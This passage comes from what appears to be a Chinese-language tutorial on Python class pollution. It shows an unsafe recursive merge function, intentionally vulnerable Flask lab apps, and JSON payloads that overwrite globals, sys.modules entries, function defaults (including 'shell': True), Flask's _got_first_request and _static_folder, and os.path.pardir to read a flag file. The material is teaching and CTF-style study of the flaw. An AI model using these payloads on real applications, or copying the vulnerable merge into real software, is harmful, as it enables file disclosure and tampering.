<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">mihomo = <span class="number">114514</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Genshin</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Honkai</span>():</span><br><span class="line">    music = <span class="string">&quot;Proi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZZZ</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">StarRailway = ZZZ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;mihomo&quot;</span> : <span class="number">1919810</span>,</span><br><span class="line">                <span class="string">&quot;Honkai&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;music&quot;</span> : <span class="string">&quot;jiaojiao&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Honkai.music)</span><br><span class="line"><span class="built_in">print</span>(mihomo)</span><br><span class="line"></span><br><span class="line">merge(payload,StarRailway)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Honkai.music)</span><br><span class="line"><span class="built_in">print</span>(mihomo)</span><br></pre></td></tr></table></figure>
<p>成功获取并污染全局变量</p>
<p><img src="/img/lazy.gif" data-original="w12.png" alt=""></p>
<h6 id="sys模块加载"><a href="#sys模块加载" class="headerlink" title="sys模块加载"></a>sys模块加载</h6><p><code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p>
<p>这里给到两个模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后另一个模块导入这一模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="加载器loader获取"><a href="#加载器loader获取" class="headerlink" title="加载器loader获取"></a>加载器loader获取</h6><p>loader加载器在python中的作用是为实现模块加载而设计的类，其在<code>importlib</code>这一内置模块中有具体实现。而<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过<code>loader.__init__.__globals__[&#39;sys&#39;]</code>来获取到sys模块，然后再获取到我们想要的模块</p>
<p>对于一个模块来说，模块中的一些内置属性会在被加载时自动填充</p>
<p><img src="/img/lazy.gif" data-original="w13.png" alt=""></p>
<p><code>__loader__</code>内置属性会被赋值为加载该模块的<code>loader</code>，这样只要能获取到任意的模块便能通过<code>__loader__</code>属性获取到<code>loader</code>，而且对于<code>python3</code>来说除了在<code>debug</code>模式下的主文件中<code>__loader__</code>为<code>None</code>以外，正常执行的情况每个模块的<code>__loader__</code>属性均有一个对应的类</p>
<p>另外Python还存在一个<code>__spec__</code>内置函数，包含了关于类加载时候的信息，可以直接用</p>
<p><code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p>
<h6 id="形参默认值替换"><a href="#形参默认值替换" class="headerlink" title="形参默认值替换"></a>形参默认值替换</h6><p>分为<code>__defaults__</code>和<code>__kwdefaults__</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(a.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br></pre></td></tr></table></figure>
<p>（Python中带有默认值的参数必须位于不带默认值的参数之后）</p>
<p>元组：（<strong>有序的、不可变的序列类型</strong>）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my_tuple = (<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;hello&quot;</span>, [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">0</span>])  <span class="comment"># 输出 1</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[-<span class="number">1</span>])  <span class="comment"># 输出 [3, 4, 5]</span></span><br></pre></td></tr></table></figure>
<p>然后就是可以对函数进行默认值的替换</p>
<p>前提是要替换的值是元组的形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;demo&quot; : &#123;</span><br><span class="line">                &quot;__defaults__&quot; : (True,)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一个则是以字典形式替换：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;demo&quot; : &#123;</span><br><span class="line">                &quot;__kwdefaults__&quot; : &#123;</span><br><span class="line">                    &quot;shell&quot; : True</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="got-first-request："><a href="#got-first-request：" class="headerlink" title="_got_first_request："></a>_got_first_request：</h6><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，而<code>_got_first_request</code>值为假时才会调用：</p>
<p>所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将<code>_got_first_request</code>从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器<code>app.before_first_request</code>下面的可用信息：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Is flag here?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app, <span class="string">&quot;special&quot;</span>) <span class="keyword">and</span> app.special == <span class="string">&quot;U_Polluted_It&quot;</span>:</span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="built_in">setattr</span>(app, <span class="string">&quot;special&quot;</span>, <span class="string">&quot;U_Polluted_It&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>before_first_request</code>修饰的<code>init</code>函数只会在第一次访问前被调用，而其中读取<code>flag</code>的逻辑又需要访问路由<code>/</code>后才能触发，这就构成了矛盾。所以需要使用<code>payload</code>在访问<code>/</code>后重置<code>_got_first_request</code>属性值为假，这样<code>before_first_request</code>才会再次调用</p>
<p>Payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;_got_first_request&quot;</span><span class="punctuation">:</span>False</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>init</code>函数被触发，且其中读取<code>flag</code>的相关逻辑被执行，这样就获得了<code>flag</code></p>
<h6 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path:"></a>_static_url_path:</h6><p>当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#static/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Tech Otakus Save The World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>app.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/index.html&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;app&quot;:&#123;</span><br><span class="line">                &quot;_static_folder&quot;:&quot;./&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir:"></a>os.path.pardir:</h6><p><code>os.path.pardir</code> 是 Python 中 <code>os.path</code> 模块的一个常量，它代表当前目录的父目录（即上一级目录）。在文件系统中，<code>os.path.pardir</code> 通常对应于字符串 <code>..</code></p>
<p>环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;Tech Otakus Save The World&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but u just can use /file to vist ./templates/file&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里的话你进行一个目录穿梭比如：</p>
<p><code>../1.py</code>这样子的会报错，因为python里的<code>split_template_path</code>如果发现..就会报错或者直接不允许穿越，而我们的<code>os.path.pardir</code>恰好是我们的..所以会进行报错，所以我们如果把这个地方进行修改为除..外的任意值，我们就可以进行目录穿梭了</p>
<p>payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;pardir&quot;</span><span class="punctuation">:</span><span class="string">&quot;,&quot;</span></span><br><span 